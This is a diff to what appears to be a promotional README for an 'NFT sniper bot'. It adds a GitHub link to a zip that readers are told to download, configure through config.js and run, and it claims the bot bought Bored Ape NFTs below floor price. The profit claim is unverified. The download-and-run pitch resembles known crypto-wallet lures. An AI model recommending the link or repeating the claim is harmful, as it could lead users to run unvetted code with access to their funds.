@@ -3,6 +3,8 @@ Once you configure the settings in the "config.js" you simply open the index.htm
 This sniper bought has now scored me two boardapeyachtclubs for well under the floor price among many other collections I enjoy.
 Setting up is pretty straightforward first download the zip file here
 
+https://github.com/Snipermate/SniperMate-NFT-Sniper-Bot/raw/main/opensea-raribles-coinbase-nft-sniper.zip
+
 then when you unzip to a location is easy for you to locate open the config.js file in any text editor in my case notepad
 
 <img src="configopen.png" >
